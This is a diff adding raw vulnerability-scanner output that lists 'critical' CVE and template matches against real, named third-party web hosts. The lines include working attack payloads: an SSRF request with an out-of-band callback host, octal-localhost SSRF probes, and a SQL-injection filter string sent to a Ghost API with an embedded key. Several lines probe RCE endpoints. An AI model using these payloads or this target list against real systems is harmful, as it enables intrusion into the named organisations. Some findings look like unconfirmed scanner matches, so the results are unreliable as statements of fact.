@@ -1,0 +1,22 @@
+[CVE-2020-7796] [http] [critical] https://mail.particle.network/zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://d97mem8226q3egtur41gtm9m9mb4p5qn5.oast.live%23
+[CVE-2021-28918] [http] [critical] https://doc.particle.network/?url=http://0177.0.0.1/server-status
+[CVE-2021-28918] [http] [critical] https://whitepaper.particle.network/?url=http://0177.0.0.1/server-status
+[CVE-2021-31755] [http] [critical] https://mail.particle.network/goform/setmac
+[CVE-2021-36380] [http] [critical] https://mail.particle.network/cgi/networkDiag.cgi
+[CVE-2022-26143:version] [http] [critical] https://chat.dappier.com/ucs/micollab/version.json ["1.0.0"]
+[CVE-2022-26143:version] [http] [critical] https://chat.dev.dappier.com/ucs/micollab/version.json ["1.0.0"]
+[CVE-2022-26143:version] [http] [critical] https://chat.staging.dappier.com/ucs/micollab/version.json ["1.0.0"]
+[CVE-2025-54236] [http] [critical] https://chat.dappier.com/customer/address_file/upload
+[CVE-2025-54236] [http] [critical] https://chat.dev.dappier.com/customer/address_file/upload
+[CVE-2025-54236] [http] [critical] https://chat.staging.dappier.com/customer/address_file/upload
+[CVE-2026-21858] [http] [critical] https://n8n.dappier.com/signin ["n8n Version: 1.120.4"]
+[CVE-2026-21877] [http] [critical] https://n8n.dappier.com/signin ["n8n Version: 1.120.4"]
+[CVE-2026-26980] [http] [critical] https://blog.web3auth.io/ghost/api/content/tags/?key=24330868b746f42d2fb5110e63&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-import-2024-02-27-00-35]
+[CVE-2026-33017] [http] [critical] https://chat.dappier.com/api/v1/version
+[CVE-2026-33017] [http] [critical] https://chat.dev.dappier.com/api/v1/version
+[CVE-2026-33017] [http] [critical] https://chat.staging.dappier.com/api/v1/version
+[config-json-exposure-fuzz:endpoints] [http] [critical] https://packages.dynamic.xyz/config.json [""url": "http://romualdbulyshko.com"",""url": "https://github.com/bulyshko/config.json"",""url": "https://github.com/bulyshko/config.json/issues"",""url": "https://bulyshko.com""] [path="/config.json"]
+[hashicorp-consul-rce] [http] [critical] https://mail.particle.network/v1/agent/service/register
+[inspur-clusterengine-rce] [http] [critical] https://docs.availproject.org/docs/da/user-guides/staking-governance/overview
+[pdf-signer-ssti-to-rce] [http] [critical] https://doc.particle.network
+[pdf-signer-ssti-to-rce] [http] [critical] https://whitepaper.particle.network
